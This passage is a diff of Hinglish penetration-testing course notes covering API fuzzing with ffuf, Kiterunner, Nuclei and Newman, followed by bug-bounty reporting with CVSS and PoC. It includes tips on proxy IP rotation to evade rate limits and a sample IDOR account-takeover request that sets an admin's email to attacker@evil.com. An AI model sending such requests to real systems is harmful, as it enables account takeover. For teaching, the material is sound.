-[[HL::##### 🔬 Code Explanation Rule (LINE-BY-LINE)::HL]]
+##### 🔬 Code Explanation Rule (LINE-BY-LINE)
 
-[[HL::**Python Script (Line 7):** `requests.post(url, headers=headers, json=data)`::HL]]
+**Python Script (Line 7):** `requests.post(url, headers=headers, json=data)`
 
-[[HL::* **What it does:** Ek HTTP POST request bhejta hai target API pe, jisme headers aur JSON payload include hota hai.::HL]]
-[[HL::* **Why it's needed:** Custom attack logic (jaise race condition, jahan ek millisecond mein bohot saari requests bhejni hoti hain) CLI tools mein kabhi-kabhi hard hota hai, toh Python script perfect control deti hai.::HL]]
+* **What it does:** Ek HTTP POST request bhejta hai target API pe, jisme headers aur JSON payload include hota hai.
+* **Why it's needed:** Custom attack logic (jaise race condition, jahan ek millisecond mein bohot saari requests bhejni hoti hain) CLI tools mein kabhi-kabhi hard hota hai, toh Python script perfect control deti hai.
 
-[[HL::### 🔒 8. Attack Surface & Defense (Dual Perspective)::HL]]
+### 🔒 8. Attack Surface & Defense (Dual Perspective)
 
-[[HL::**🔴 Attacker Perspective:** CLI automation se attacker massive attack surface jaldi cover karta hai. Ffuf se hidden APIs nikalta hai, aur Python se complex multi-step exploits automate karta hai.::HL]]
-[[HL::**🔵 Defender Perspective:** Defense mein WAF (Web Application Firewall — malicious traffic block karne wala system) lagana zaroori hai jo ffuf ya scripts ke automated, high-velocity traffic ko rate-limit (request ki speed limit) kare ya block kare.::HL]]
+**🔴 Attacker Perspective:** CLI automation se attacker massive attack surface jaldi cover karta hai. Ffuf se hidden APIs nikalta hai, aur Python se complex multi-step exploits automate karta hai.
+**🔵 Defender Perspective:** Defense mein WAF (Web Application Firewall — malicious traffic block karne wala system) lagana zaroori hai jo ffuf ya scripts ke automated, high-velocity traffic ko rate-limit (request ki speed limit) kare ya block kare.
 
-[[HL::### 🌍 9. Real-World Penetration Testing Use-Case::HL]]
+### 🌍 9. Real-World Penetration Testing Use-Case
 
-[[HL::Bug bounty programs mein "first blood" (sabse pehle bug submit karna) ka khel hota hai. Ek senior bug bounty hunter jab target pe aata hai, woh GUI pe time waste nahi karta. Woh turant `kiterunner` se routes nikalta hai, unhe `ffuf` mein pass karke live endpoints check karta hai, aur results ko `nuclei` mein pipe kar deta hai. Sab kuch ek bash script mein automate hota hai taaki sote waqt bhi target monitor hota rahe.::HL]]
+Bug bounty programs mein "first blood" (sabse pehle bug submit karna) ka khel hota hai. Ek senior bug bounty hunter jab target pe aata hai, woh GUI pe time waste nahi karta. Woh turant `kiterunner` se routes nikalta hai, unhe `ffuf` mein pass karke live endpoints check karta hai, aur results ko `nuclei` mein pipe kar deta hai. Sab kuch ek bash script mein automate hota hai taaki sote waqt bhi target monitor hota rahe.
 
-[[HL::### ⚠️ 10. Pentest Anti-Patterns & Common Mistakes (Beginner Traps)::HL]]
+### ⚠️ 10. Pentest Anti-Patterns & Common Mistakes (Beginner Traps)
 
-[[HL::* **❌ Mistake:** Ffuf ko bina delay ya rate-limiting ke production server par chala dena.::HL]]
-[[HL::* **🤦 Why:** Beginners sochte hain ki jitni zyada speed, utna accha result.::HL]]
-[[HL::* **✅ The 'Pro' Way:** Threads control karo aur `-p` (pause) flag use karo taaki server overload na ho.::HL]]
-[[HL::* **⚡ Consequences:** Denial of Service (DoS) ho jayega aur target crash ho sakta hai, jisse client naraz hoga.::HL]]
-[[HL::* **❌ Mistake:** Postman collections banake sirf GUI mein chor dena.::HL]]
-[[HL::* **✅ The 'Pro' Way:** Collection ko Newman ke through run karo aur CI/CD pipelines mein integrate karo taaki har code commit pe security checks automatic hon.::HL]]
-[[HL::* **⚡ Consequences:** Manual testing mein regressions (purane patched bugs wapas aana) miss ho jayenge.::HL]]
+* **❌ Mistake:** Ffuf ko bina delay ya rate-limiting ke production server par chala dena.
+* **🤦 Why:** Beginners sochte hain ki jitni zyada speed, utna accha result.
+* **✅ The 'Pro' Way:** Threads control karo aur `-p` (pause) flag use karo taaki server overload na ho.
+* **⚡ Consequences:** Denial of Service (DoS) ho jayega aur target crash ho sakta hai, jisse client naraz hoga.
+* **❌ Mistake:** Postman collections banake sirf GUI mein chor dena.
+* **✅ The 'Pro' Way:** Collection ko Newman ke through run karo aur CI/CD pipelines mein integrate karo taaki har code commit pe security checks automatic hon.
+* **⚡ Consequences:** Manual testing mein regressions (purane patched bugs wapas aana) miss ho jayenge.
 
-[[HL::### 🤔 11. Agar Dimag Ghoom Raha Hai? (Confusion Clarifier)::HL]]
+### 🤔 11. Agar Dimag Ghoom Raha Hai? (Confusion Clarifier)
 
-[[HL::* **Confusion 1 — "Kya ffuf aur Kiterunner same kaam karte hain?"**::HL]]
-[[HL::* **Galat soch:** Dono bas URLs guess karte hain, koi ek use karlo.::HL]]
-[[HL::* **Actually:** Ffuf generic web fuzzer hai (kisi bhi word ko try karega). Kiterunner API-specific hai — yeh directly JSON/Swagger structures aur API verbs (GET, POST, PUT) ke combinations ko samajhta aur test karta hai.::HL]]
-[[HL::* **Prove karo:** Ffuf ko normal wordlist do, aur Kiterunner ko `.kite` file do. Kiterunner API routes zyada accurately nikalaega jahan HTTP methods zaroori hote hain.::HL]]
+* **Confusion 1 — "Kya ffuf aur Kiterunner same kaam karte hain?"**
+* **Galat soch:** Dono bas URLs guess karte hain, koi ek use karlo.
+* **Actually:** Ffuf generic web fuzzer hai (kisi bhi word ko try karega). Kiterunner API-specific hai — yeh directly JSON/Swagger structures aur API verbs (GET, POST, PUT) ke combinations ko samajhta aur test karta hai.
+* **Prove karo:** Ffuf ko normal wordlist do, aur Kiterunner ko `.kite` file do. Kiterunner API routes zyada accurately nikalaega jahan HTTP methods zaroori hote hain.
 
 
-[[HL::* **Confusion 2 — "Postman aur Newman mein kya farq hai?"**::HL]]
-[[HL::* **Galat soch:** Dono alag tools hain alag kaam ke liye.::HL]]
-[[HL::* **Actually:** Dono exactly same hain. Postman uska graphical user interface (GUI) version hai jisme buttons hote hain, aur Newman uska command-line interface (CLI) version hai.::HL]]
-[[HL::* **Prove karo:** Postman se collection JSON format mein export karo aur terminal mein `newman run` karke dekho — wahi requests chalengi.::HL]]
+* **Confusion 2 — "Postman aur Newman mein kya farq hai?"**
+* **Galat soch:** Dono alag tools hain alag kaam ke liye.
+* **Actually:** Dono exactly same hain. Postman uska graphical user interface (GUI) version hai jisme buttons hote hain, aur Newman uska command-line interface (CLI) version hai.
+* **Prove karo:** Postman se collection JSON format mein export karo aur terminal mein `newman run` karke dekho — wahi requests chalengi.
 
 
-[[HL::* **Confusion 3 — "Nuclei kaise pata lagata hai ki misconfiguration hai?"**::HL]]
-[[HL::* **Galat soch:** Yeh AI se bug dhoondhta hai.::HL]]
-[[HL::* **Actually:** Yeh "YAML templates" (text files jisme rules likhe hote hain ki "agar HTTP response mein yeh specific word aaye toh bug hai") par base karke string matching karta hai.::HL]]
-[[HL::* **Prove karo:** Nuclei-templates folder open karke kisi bhi `.yaml` file ko notepad mein dekho, usme simple matching conditions dikhengi.::HL]]
+* **Confusion 3 — "Nuclei kaise pata lagata hai ki misconfiguration hai?"**
+* **Galat soch:** Yeh AI se bug dhoondhta hai.
+* **Actually:** Yeh "YAML templates" (text files jisme rules likhe hote hain ki "agar HTTP response mein yeh specific word aaye toh bug hai") par base karke string matching karta hai.
+* **Prove karo:** Nuclei-templates folder open karke kisi bhi `.yaml` file ko notepad mein dekho, usme simple matching conditions dikhengi.
 
 
 
-[[HL::### 🛠️ 12. Troubleshooting Flowchart (Tool/Exploit Issues)::HL]]
+### 🛠️ 12. Troubleshooting Flowchart (Tool/Exploit Issues)
 
-[[HL::* **`ffuf shows 429 Too Many Requests for all endpoints`**::HL]]
-[[HL::* **Root Cause:** Target ka WAF tumhari high speed pakad raha hai aur rate-limit kar raha hai.::HL]]
-[[HL::* **Fix:** Ffuf command mein `-p 0.5` (delay) aur threads kam (`-t 10`) karo.::HL]]
+* **`ffuf shows 429 Too Many Requests for all endpoints`**
+* **Root Cause:** Target ka WAF tumhari high speed pakad raha hai aur rate-limit kar raha hai.
+* **Fix:** Ffuf command mein `-p 0.5` (delay) aur threads kam (`-t 10`) karo.
 
 
-[[HL::* **`Newman throws SSL Certificate Error`**::HL]]
-[[HL::* **Root Cause:** Target pe self-signed ya invalid SSL certificate hai.::HL]]
-[[HL::* **Fix:** Newman run karte waqt `-k` (insecure) flag lagao certificate check bypass karne ke liye.::HL]]
+* **`Newman throws SSL Certificate Error`**
+* **Root Cause:** Target pe self-signed ya invalid SSL certificate hai.
+* **Fix:** Newman run karte waqt `-k` (insecure) flag lagao certificate check bypass karne ke liye.
 
 
-[[HL::* **`Nuclei zero findings dikha raha hai par target vulnerable hai`**::HL]]
-[[HL::* **Root Cause:** Tumhare Nuclei templates outdated hain.::HL]]
-[[HL::* **Fix:** Command `nuclei -up` run karo taaki latest YAML templates download ho jayein.::HL]]
+* **`Nuclei zero findings dikha raha hai par target vulnerable hai`**
+* **Root Cause:** Tumhare Nuclei templates outdated hain.
+* **Fix:** Command `nuclei -up` run karo taaki latest YAML templates download ho jayein.
 
 
 
-[[HL::### ⚖️ 13. Comparison (GUI vs CLI)::HL]]
+### ⚖️ 13. Comparison (GUI vs CLI)
 
-[[HL::| Feature | GUI Tooling (Postman, Burp Suite) | CLI Tooling (Newman, ffuf, scripts) |::HL]]
-[[HL::| --- | --- | --- |::HL]]
-[[HL::| **Speed** | Slow (manual clicking) | Extremely Fast (Automated) |::HL]]
-[[HL::| **Pipeline Integration** | Hard/Impossible | Very Easy (CI/CD pipelines) |::HL]]
-[[HL::| **Learning Curve** | Easy (Visual interface) | Moderate (Requires terminal knowledge) |::HL]]
+| Feature | GUI Tooling (Postman, Burp Suite) | CLI Tooling (Newman, ffuf, scripts) |
+| --- | --- | --- |
+| **Speed** | Slow (manual clicking) | Extremely Fast (Automated) |
+| **Pipeline Integration** | Hard/Impossible | Very Easy (CI/CD pipelines) |
+| **Learning Curve** | Easy (Visual interface) | Moderate (Requires terminal knowledge) |
 
-[[HL::### 🔄 14. Kill Chain & Attack Phase Flow::HL]]
+### 🔄 14. Kill Chain & Attack Phase Flow
 
-[[HL::* **⚔️ Attack Phase:** Reconnaissance / Automation::HL]]
-[[HL::* **📍 Kill Chain Position:** Pre-Exploitation & Initial Discovery::HL]]
-[[HL::* **🔗 This connects to:** Exploitation phase jahan discovered paths pe attack hoga.::HL]]
-[[HL::* **🔄 Flow:** Wordlist -> Kiterunner/ffuf (Discovery) -> Endpoints -> Nuclei/Python requests (Automated Exploitation).::HL]]
+* **⚔️ Attack Phase:** Reconnaissance / Automation
+* **📍 Kill Chain Position:** Pre-Exploitation & Initial Discovery
+* **🔗 This connects to:** Exploitation phase jahan discovered paths pe attack hoga.
+* **🔄 Flow:** Wordlist -> Kiterunner/ffuf (Discovery) -> Endpoints -> Nuclei/Python requests (Automated Exploitation).
 
-[[HL::### 🎨 15. Visual Diagram (ASCII Art — CLI Automation Flow)::HL]]
+### 🎨 15. Visual Diagram (ASCII Art — CLI Automation Flow)
 
-[[HL::```text::HL]]
-[[HL::[Wordlist/Collection] --> (CLI Tools) --> [Target API]::HL]]
-[[HL::                           |-- ffuf (Fuzzing)::HL]]
-[[HL::                           |-- kr (Route Discovery)::HL]]
-[[HL::                           |-- nuclei (Misconfigs)::HL]]
-[[HL::                           |-- newman (Collection Exec)::HL]]
-[[HL::                                   |::HL]]
-[[HL::                                   v::HL]]
-[[HL::                          [Output/Findings] --> Python Script (Deep Exploitation)::HL]]
+```text
+[Wordlist/Collection] --> (CLI Tools) --> [Target API]
+                           |-- ffuf (Fuzzing)
+                           |-- kr (Route Discovery)
+                           |-- nuclei (Misconfigs)
+                           |-- newman (Collection Exec)
+                                   |
+                                   v
+                          [Output/Findings] --> Python Script (Deep Exploitation)
 
-[[HL::```::HL]]
+```
 
-[[HL::### ❓ 16. Interview & Certification Exam Q&A::HL]]
+### ❓ 16. Interview & Certification Exam Q&A
 
-[[HL::* **Q:** Ffuf mein custom headers kaise add karte hain, jaise Authorization token?::HL]]
-[[HL::* **A:** Hum `-H` flag use karte hain. Example: `ffuf -u https://api.target.com/FUZZ -w list.txt -H "Authorization: Bearer token123"`. Yeh authenticated API endpoints dhoondhne ke liye critical hai.::HL]]
+* **Q:** Ffuf mein custom headers kaise add karte hain, jaise Authorization token?
+* **A:** Hum `-H` flag use karte hain. Example: `ffuf -u https://api.target.com/FUZZ -w list.txt -H "Authorization: Bearer token123"`. Yeh authenticated API endpoints dhoondhne ke liye critical hai.
 
 
-[[HL::* **Q:** CI/CD pipeline kya hoti hai aur Newman usme kaise help karta hai?::HL]]
-[[HL::* **A:** CI/CD (Continuous Integration/Continuous Deployment — code likhne se leke server pe dalne tak ka automated process) mein jab developers naya code push karte hain, Newman automatically Postman tests run kar sakta hai pipeline ke andar, taaki code live hone se pehle security verify ho jaye.::HL]]
+* **Q:** CI/CD pipeline kya hoti hai aur Newman usme kaise help karta hai?
+* **A:** CI/CD (Continuous Integration/Continuous Deployment — code likhne se leke server pe dalne tak ka automated process) mein jab developers naya code push karte hain, Newman automatically Postman tests run kar sakta hai pipeline ke andar, taaki code live hone se pehle security verify ho jaye.
 
 
-[[HL::* **Q:** Agar ek API rate-limited hai, toh Python `requests` se fuzzing kaise karoge?::HL]]
-[[HL::* **A:** Main Python script mein `time.sleep()` function laga dunga request bhejne ke baad, ya phir proxies ka pool (bohot saare alag IPs) use karunga har request alag IP se bhejne ke liye (IP rotation).::HL]]
+* **Q:** Agar ek API rate-limited hai, toh Python `requests` se fuzzing kaise karoge?
+* **A:** Main Python script mein `time.sleep()` function laga dunga request bhejne ke baad, ya phir proxies ka pool (bohot saare alag IPs) use karunga har request alag IP se bhejne ke liye (IP rotation).
 
 
-[[HL::* **Q:** Kiterunner normal wordlist fuzzer se behtar kyun hai APIs ke liye?::HL]]
-[[HL::* **A:** Kyunki APIs RESTful hoti hain jahan path ke saath HTTP method (GET, POST, DELETE) bhi match hona zaroori hai. Kiterunner path aur method dono ko intelligently brute-force karta hai.::HL]]
+* **Q:** Kiterunner normal wordlist fuzzer se behtar kyun hai APIs ke liye?
+* **A:** Kyunki APIs RESTful hoti hain jahan path ke saath HTTP method (GET, POST, DELETE) bhi match hona zaroori hai. Kiterunner path aur method dono ko intelligently brute-force karta hai.
 
 
 
-[[HL::### 📝 17. One-Line Memory Hook::HL]]
+### 📝 17. One-Line Memory Hook
 
-[[HL::"GUI tools se hacking seekho, par CLI tools (ffuf, kr, nuclei) aur Python scripts se hacking kamao — automation is speed, speed is bounty."::HL]]
+"GUI tools se hacking seekho, par CLI tools (ffuf, kr, nuclei) aur Python scripts se hacking kamao — automation is speed, speed is bounty."
 
-[[HL::### 🔑 18. Keywords Coverage Verification::HL]]
+### 🔑 18. Keywords Coverage Verification
 
-[[HL::```::HL]]
-[[HL::🔑 Keywords Coverage Check — CLI & Scripting for APIs::HL]]
-[[HL::✅ Covered   : CLI tools, automation, Scripting, Python requests, API fuzzing, ffuf, Nuclei, YAML templates, Postman, Newman, CI/CD pipeline integration, Kiterunner::HL]]
-[[HL::⚠️ Mentioned but needs more depth : (none)::HL]]
-[[HL::❌ MISSED    : (none)::HL]]
+```
+🔑 Keywords Coverage Check — CLI & Scripting for APIs
+✅ Covered   : CLI tools, automation, Scripting, Python requests, API fuzzing, ffuf, Nuclei, YAML templates, Postman, Newman, CI/CD pipeline integration, Kiterunner
+⚠️ Mentioned but needs more depth : (none)
+❌ MISSED    : (none)
 
-[[HL::```::HL]]
+```
 
-[[HL::> ✅ Verified: 100% keyword coverage achieved for this topic.::HL]]
+> ✅ Verified: 100% keyword coverage achieved for this topic.
 
-[[HL::---::HL]]
+---
 
-[[HL::### 🎯 2. Vulnerability Reporting (CVSS & PoC)::HL]]
+### 🎯 2. Vulnerability Reporting (CVSS & PoC)
 
-[[HL::Is topic mein hum seekhenge ki ek professional penetration test report kaise banate hain. Ek bug milna aadhi success hai — us bug ka business impact samjhana aur usko CVSS (Common Vulnerability Scoring System) ke hisaab se score karna asli professional skill hai.::HL]]
+Is topic mein hum seekhenge ki ek professional penetration test report kaise banate hain. Ek bug milna aadhi success hai — us bug ka business impact samjhana aur usko CVSS (Common Vulnerability Scoring System) ke hisaab se score karna asli professional skill hai.
 
-[[HL::### 🐣 2. Simple Analogy (Hinglish)::HL]]
+### 🐣 2. Simple Analogy (Hinglish)
 
-[[HL::Ek vulnerability report bilkul Police FIR ki tarah hoti hai. Agar tum bas jaake bolo "chori hui hai", toh police dhyaan nahi degi. Par agar tum batao "Kahan se ghuse (PoC), kya churaya (Impact), kisne kiya, aur lock kaise fix karein (Remediation)", tabhi proper action hoga. Ek clear **PoC (Proof of Concept)** us FIR ki CCTV footage ki tarah hai jo saboot deti hai ki attack actually possible hai.::HL]]
+Ek vulnerability report bilkul Police FIR ki tarah hoti hai. Agar tum bas jaake bolo "chori hui hai", toh police dhyaan nahi degi. Par agar tum batao "Kahan se ghuse (PoC), kya churaya (Impact), kisne kiya, aur lock kaise fix karein (Remediation)", tabhi proper action hoga. Ek clear **PoC (Proof of Concept)** us FIR ki CCTV footage ki tarah hai jo saboot deti hai ki attack actually possible hai.
 
-[[HL::### 📖 3. Technical Definition::HL]]
+### 📖 3. Technical Definition
 
-[[HL::* **Precise English:** Vulnerability Reporting is the formal documentation phase where findings are prioritized using the Common Vulnerability Scoring System (CVSS) and proven via a step-by-step Proof of Concept (PoC) to demonstrate business risk and provide actionable remediation.::HL]]
-[[HL::* **Hinglish Simplification:** Jo bug mila hai use likh kar client ko dena, uski khatarnak hone ki rating (CVSS score) tay karna, aur step-by-step batana ki attack kaise reproduce hota hai (PoC).::HL]]
+* **Precise English:** Vulnerability Reporting is the formal documentation phase where findings are prioritized using the Common Vulnerability Scoring System (CVSS) and proven via a step-by-step Proof of Concept (PoC) to demonstrate business risk and provide actionable remediation.
+* **Hinglish Simplification:** Jo bug mila hai use likh kar client ko dena, uski khatarnak hone ki rating (CVSS score) tay karna, aur step-by-step batana ki attack kaise reproduce hota hai (PoC).
 
-[[HL::### 🧠 4. Why This Matters (Pentester/Red Teamer ke liye Zaroorat Kyun Hai?)::HL]]
+### 🧠 4. Why This Matters (Pentester/Red Teamer ke liye Zaroorat Kyun Hai?)
 
-[[HL::* **Problem:** Ek brilliant RCE (Remote Code Execution) finding bhi ignore/reject ho sakti hai agar developer usse apne system par reproduce nahi kar paye.::HL]]
-[[HL::* **Solution:** Ek standard report format aur clear steps to reproduce se triage (bug ko verify karne ka process) fast hota hai aur bounty jaldi milti hai.::HL]]
-[[HL::* **What breaks if we don't know this?** Triage team tumhari report "N/A" (Not Applicable) ya "Informative" mark kar degi, aur tumhe paise/credit nahi milenge.::HL]]
-[[HL::* **✅ Kab use karo (Use in engagement when):** Har ek single confirmed vulnerability ke liye report draft karni hoti hai.::HL]]
-* **❌ [[HL::Kab mat karo / Alternative::HL]] prefer karo:** Theoretical risks jinka koi tangible impact na ho (e.g., missing banner version) unhe individual severity report ki jagah scan-results annexure mein daalo.
+* **Problem:** Ek brilliant RCE (Remote Code Execution) finding bhi ignore/reject ho sakti hai agar developer usse apne system par reproduce nahi kar paye.
+* **Solution:** Ek standard report format aur clear steps to reproduce se triage (bug ko verify karne ka process) fast hota hai aur bounty jaldi milti hai.
+* **What breaks if we don't know this?** Triage team tumhari report "N/A" (Not Applicable) ya "Informative" mark kar degi, aur tumhe paise/credit nahi milenge.
+* **✅ Kab use karo (Use in engagement when):** Har ek single confirmed vulnerability ke liye report draft karni hoti hai.
+* **❌ Kab mat karo / Alternative prefer karo:** Theoretical risks jinka koi tangible impact na ho (e.g., missing banner version) unhe individual severity report ki jagah scan-results annexure mein daalo.
 
-[[HL::### 🔍 5. Visual / Terminal Mein Kya Dikhega::HL]]
+### 🔍 5. Visual / Terminal Mein Kya Dikhega
 
-[[HL::Terminal nahi, yahan ek structured Markdown document, HackerOne ka report form, ya ek web-based CVSS v3.1 calculator UI dikhega jisme bars and numbers (e.g., 7.5 High) highlight honge.::HL]]
+Terminal nahi, yahan ek structured Markdown document, HackerOne ka report form, ya ek web-based CVSS v3.1 calculator UI dikhega jisme bars and numbers (e.g., 7.5 High) highlight honge.
 
-[[HL::### ⚙️ 6. Under the Hood (Deep Dive — Reporting Flow)::HL]]
+### ⚙️ 6. Under the Hood (Deep Dive — Reporting Flow)
 
-[[HL::(1) **Discovery:** Pentester bug confirm karta hai.::HL]]
-[[HL::(2) **Scoring:** Pentester CVSS calculator use karta hai (Attack Vector, Complexity, Privileges required, User Interaction, aur CIA triad impact evaluate karke score generate karta hai).::HL]]
-[[HL::(3) **Drafting:** Title, Description, PoC (HTTP request/response proof), aur Remediation likha jata hai.::HL]]
-[[HL::(4) **Triage:** Client ki security team report padhti hai aur steps ko step-by-step execute karke bug verify karti hai.::HL]]
+(1) **Discovery:** Pentester bug confirm karta hai.
+(2) **Scoring:** Pentester CVSS calculator use karta hai (Attack Vector, Complexity, Privileges required, User Interaction, aur CIA triad impact evaluate karke score generate karta hai).
+(3) **Drafting:** Title, Description, PoC (HTTP request/response proof), aur Remediation likha jata hai.
+(4) **Triage:** Client ki security team report padhti hai aur steps ko step-by-step execute karke bug verify karti hai.
 
-[[HL::### 💻 7. Hands-On — Runnable Example (Lab-Ready Format)::HL]]
+### 💻 7. Hands-On — Runnable Example (Lab-Ready Format)
 
-[[HL::**A Standard Professional Bug Bounty Report Structure (Markdown):**::HL]]
+**A Standard Professional Bug Bounty Report Structure (Markdown):**
 
-[[HL::```markdown::HL]]
-[[HL::# 1 Title: IDOR in /api/v1/users leads to Account Takeover::HL]]
-[[HL::# 2 CVSS Score: 8.1 (High) - CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N::HL]]
+```markdown
+# 1 Title: IDOR in /api/v1/users leads to Account Takeover
+# 2 CVSS Score: 8.1 (High) - CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
 
-[[HL::# 3 Description:::HL]]
-[[HL::# 4 The endpoint `/api/v1/users/{id}/email` does not validate if the requested `id` belongs to the authenticated user. This allows any low-privileged user to change the email of an Admin account and reset their password.::HL]]
+# 3 Description:
+# 4 The endpoint `/api/v1/users/{id}/email` does not validate if the requested `id` belongs to the authenticated user. This allows any low-privileged user to change the email of an Admin account and reset their password.
 
-[[HL::# 5 Business Impact:::HL]]
-[[HL::# 6 An attacker can take full control of any user or administrator account, leading to complete data compromise and reputation loss for the company.::HL]]
+# 5 Business Impact:
+# 6 An attacker can take full control of any user or administrator account, leading to complete data compromise and reputation loss for the company.
 
-[[HL::# 7 Steps to Reproduce (Proof of Concept - PoC):::HL]]
-[[HL::# 8 1. Log in as attacker (User A) and get the JWT token.::HL]]
-[[HL::# 9 2. Intercept the request to change your email in Burp Suite (web security testing tool).::HL]]
-[[HL::# 10 3. Change the `{id}` in the URL from User A's ID to the Admin's ID.::HL]]
-[[HL::# 11 4. Send the following HTTP Request:::HL]]
-[[HL::# 12::HL]]
-[[HL::# 13 PUT /api/v1/users/1/email HTTP/1.1::HL]]
-[[HL::# 14 Host: api.target.com::HL]]
-[[HL::# 15 Authorization: Bearer <Attacker_Token>::HL]]
-[[HL::# 16 {"email": "attacker@evil.com"}::HL]]
-[[HL::# 17::HL]]
-[[HL::# 18 5. Observe the 200 OK response. Admin email is now changed.::HL]]
+# 7 Steps to Reproduce (Proof of Concept - PoC):
+# 8 1. Log in as attacker (User A) and get the JWT token.
+# 9 2. Intercept the request to change your email in Burp Suite (web security testing tool).
+# 10 3. Change the `{id}` in the URL from User A's ID to the Admin's ID.
+# 11 4. Send the following HTTP Request:
+# 12
+# 13 PUT /api/v1/users/1/email HTTP/1.1
+# 14 Host: api.target.com
+# 15 Authorization: Bearer <Attacker_Token>
+# 16 {"email": "attacker@evil.com"}
+# 17
+# 18 5. Observe the 200 OK response. Admin email is now changed.
 
-[[HL::# 19 Remediation (How to fix):::HL]]
-[[HL::# 20 Implement server-side authorization checks. Ensure the `id` from the JWT token matches the `id` in the API path before processing the request.::HL]]
+# 19 Remediation (How to fix):
+# 20 Implement server-side authorization checks. Ensure the `id` from the JWT token matches the `id` in the API path before processing the request.
 
-[[HL::```::HL]]
+```
 
-[[HL::```::HL]]
-[[HL::# 📤 Expected Output: (This is a document structure, it will be rendered as a formatted report in platforms like HackerOne/Bugcrowd)::HL]]
+```
+# 📤 Expected Output: (This is a document structure, it will be rendered as a formatted report in platforms like HackerOne/Bugcrowd)
 
-[[HL::```::HL]]
+```
 
-[[HL::##### 🔬 Code Explanation Rule (LINE-BY-LINE)::HL]]
+##### 🔬 Code Explanation Rule (LINE-BY-LINE)
 
-[[HL::**Markdown Report (Line 2):** `CVSS Score: 8.1 (High) - CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`::HL]]
+**Markdown Report (Line 2):** `CVSS Score: 8.1 (High) - CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`
 
-[[HL::* **What it does:** Yeh CVSS v3.1 ka vector string hai. Har letter ek metric batata hai: AV:N (Network se attack), AC:L (Complexity Low hai), PR:L (Low Privileges chahiye), UI:N (User interaction nahi chahiye), C/I/A (Confidentiality aur Integrity High impact, Availability No impact).::HL]]
-[[HL::* **Why it's needed:** Security teams is string ko dekh ke 2 second mein samajh jati hain ki bug kitna dangerous hai.::HL]]
+* **What it does:** Yeh CVSS v3.1 ka vector string hai. Har letter ek metric batata hai: AV:N (Network se attack), AC:L (Complexity Low hai), PR:L (Low Privileges chahiye), UI:N (User interaction nahi chahiye), C/I/A (Confidentiality aur Integrity High impact, Availability No impact).
+* **Why it's needed:** Security teams is string ko dekh ke 2 second mein samajh jati hain ki bug kitna dangerous hai.
 
-[[HL::### 🔒 8. Attack Surface & Defense (Dual Perspective)::HL]]
+### 🔒 8. Attack Surface & Defense (Dual Perspective)
 
-[[HL::**🔴 Attacker Perspective:** Ek accha attacker humesha **business impact** par focus karta hai. Technical bug (jaise XSS) ki value kam hoti hai jab tak tum yeh na dikhao ki us XSS se Admin ka session steal ho raha hai.::HL]]
-[[HL::**🔵 Defender Perspective:** Defense/Triage team report ko analyze karke uski severity tay karti hai taaki developers ko prioritize kar sake. Agar PoC fail ho jata hai, toh ticket close kar di jati hai as "Cannot Reproduce".::HL]]
+**🔴 Attacker Perspective:** Ek accha attacker humesha **business impact** par focus karta hai. Technical bug (jaise XSS) ki value kam hoti hai jab tak tum yeh na dikhao ki us XSS se Admin ka session steal ho raha hai.
+**🔵 Defender Perspective:** Defense/Triage team report ko analyze karke uski severity tay karti hai taaki developers ko prioritize kar sake. Agar PoC fail ho jata hai, toh ticket close kar di jati hai as "Cannot Reproduce".
 
-[[HL::### 🌍 9. Real-World Penetration Testing Use-Case::HL]]
+### 🌍 9. Real-World Penetration Testing Use-Case
 
-[[HL::Bug bounty (jaise HackerOne) mein agar tum ek BOLA/IDOR bug dhundhte ho, aur report mein likhte ho "I can view other user IDs", toh shayad $500 milen (Medium severity). Par agar wahi bug tum exact HTTP requests ke saath document karo aur dikhao ki "I can view other user's PII (Personal Identifiable Information) including Credit Card data", toh wahi report ka CVSS score Critical ho jayega aur payout $5000+ ho sakta hai. Good reporting equals more money.::HL]]
+Bug bounty (jaise HackerOne) mein agar tum ek BOLA/IDOR bug dhundhte ho, aur report mein likhte ho "I can view other user IDs", toh shayad $500 milen (Medium severity). Par agar wahi bug tum exact HTTP requests ke saath document karo aur dikhao ki "I can view other user's PII (Personal Identifiable Information) including Credit Card data", toh wahi report ka CVSS score Critical ho jayega aur payout $5000+ ho sakta hai. Good reporting equals more money.
 
-[[HL::### ⚠️ 10. Pentest Anti-Patterns & Common Mistakes (Beginner Traps)::HL]]
+### ⚠️ 10. Pentest Anti-Patterns & Common Mistakes (Beginner Traps)
 
-[[HL::* **❌ Mistake:** PoC mein vague statements likhna jaise "Just exploit the parameter".::HL]]
-[[HL::* **🤦 Why:** Beginner sochta hai ki developer security expert hai aur khud samajh jayega.::HL]]
-[[HL::* **✅ The 'Pro' Way:** Exact HTTP request aur response paste karo. Step 1 se leke Step End tak fool-proof instructions do.::HL]]
-[[HL::* **⚡ Consequences:** Developer reproduce nahi kar payega aur bug fix nahi hoga.::HL]]
-[[HL::* **❌ Mistake:** Har bug ko CVSS 10.0 (Critical) rate kar dena.::HL]]
-[[HL::* **✅ The 'Pro' Way:** Honest aur objective scoring karo. Agar user interaction chahiye toh severity kam hoti hai.::HL]]
-[[HL::* **⚡ Consequences:** Client ka trust khatam ho jayega aur tumhe unprofessional mana jayega.::HL]]
+* **❌ Mistake:** PoC mein vague statements likhna jaise "Just exploit the parameter".
+* **🤦 Why:** Beginner sochta hai ki developer security expert hai aur khud samajh jayega.
+* **✅ The 'Pro' Way:** Exact HTTP request aur response paste karo. Step 1 se leke Step End tak fool-proof instructions do.
+* **⚡ Consequences:** Developer reproduce nahi kar payega aur bug fix nahi hoga.
+* **❌ Mistake:** Har bug ko CVSS 10.0 (Critical) rate kar dena.
+* **✅ The 'Pro' Way:** Honest aur objective scoring karo. Agar user interaction chahiye toh severity kam hoti hai.
+* **⚡ Consequences:** Client ka trust khatam ho jayega aur tumhe unprofessional mana jayega.
 
-[[HL::### 🤔 11. Agar Dimag Ghoom Raha Hai? (Confusion Clarifier)::HL]]
+### 🤔 11. Agar Dimag Ghoom Raha Hai? (Confusion Clarifier)
 
-[[HL::* **Confusion 1 — "PoC aur Exploit mein kya difference hai?"**::HL]]
-[[HL::* **Galat soch:** Dono same cheez hain — script jo system hack kare.::HL]]
